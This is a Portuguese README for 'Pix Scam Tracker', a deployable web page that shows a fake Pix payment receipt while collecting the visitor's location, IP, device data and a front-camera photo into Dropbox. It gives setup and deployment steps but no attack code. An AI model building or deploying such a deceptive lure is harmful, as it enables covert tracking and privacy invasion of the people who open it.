# PST - Pix Scam Tracker

Aplicação web que gera um comprovante de pagamento simulado após obter permissão do usuário para acesso à localização e dados do dispositivo. As informações coletadas são armazenadas automaticamente no Dropbox e, com autorização, uma imagem da câmera frontal também pode ser capturada.

## Pré-requisitos

- Conta Vercel (para deploy)
- Conta Dropbox (para armazenamento)

## Configuração

### 1. Configurar Dropbox

1. Faça o fork deste repositório.
2. Renomeie o repositório (o nome será usado pelo Vercel para gerar a URL).

### 2. Configurar Dropbox

1. Acesse [Dropbox Developers](https://www.dropbox.com/developers/apps)
2. Crie um novo app com as seguintes permissões:
   - `files.content.write`
   - `files.content.read`
3. Gere um [Refresh Token](https://www.limontec.com/2024/08/dropbox-como-obter-refresh-token.html) (não expira)
4. Anote suas credenciais:
   - App Key
   - App Secret
   - Refresh Token

### 3. Variáveis de Ambiente

Em sua máquina copie o conteúdo do arquivo `.env.example` para `.env.local` e preencha com suas credenciais do Dropbox:

```bash
DROPBOX_APP_KEY=sua_app_key
DROPBOX_APP_SECRET=seu_app_secret
DROPBOX_REFRESH_TOKEN=seu_refresh_token
NODE_ENV=production
```

### 4. Conecte seu repositório GitHub diretamente na Vercel.

**Importante:** Configure as variáveis de ambiente na Vercel:
- Settings → Environment Variables
- Importe o arquivo `.env.local`
- Realize o deploy

## Estrutura do Projeto

```
.
├── api/
│   └── dbx.js             # API para salvar dados no Dropbox
│   └── upload-photo.js    # API para salvar foto no Dropbox
├── index.html             # Página principal
├── styles.css             # Estilos da página
├── script.js              # Lógica do frontend
├── package.json           # Dependências
├── vercel.json            # Configuração Vercel
├── .env.example           # Exemplo de variáveis de ambiente
└── README.md              # Este arquivo
```

## Dados Coletados

O sistema coleta as seguintes informações:

- **Localização:** Latitude, longitude e precisão
- **Dispositivo:** Plataforma, CPU, memória, resolução de tela
- **Rede:** IP do usuário, tipo de conexão
- **Sistema:** Nível de bateria, fuso horário, User Agent
- **Foto:** Câmera frontal

## Personalização

### Alterar Dados do Comprovante

Edite em `index.html`:

```html
<div class="info-row highlight">
    <span class="info-label">Valor Pago:</span>
    <span class="info-value amount">R$ 1.000,00</span>
</div>
```

### Alterar Cores

Edite as variáveis CSS em `styles.css`:

```css
:root {
    --primary-color: #3498db;
    --success-color: #27ae60;
    --danger-color: #e74c3c;
    /* ... */
}
```

## Troubleshooting

### Erro 405 - Método não permitido
- Certifique-se de que a API está recebendo POST

### Erro 500 - Erro ao salvar no Dropbox
- Verifique as credenciais do Dropbox
- Confirme que o refresh token está correto
- Verifique as permissões do app

### Localização ou câmera não funciona
- Verifique permissões do navegador
- Teste em diferentes navegadores

## Licença

MIT License - Veja o arquivo LICENSE para detalhes.

## Responsabilidade Legal

O uso deste sistema é de **total responsabilidade de quem realizar deploy**. Não nos responsabilizamos pelos seus atos.

---

**Desenvolvido para fins educacionais**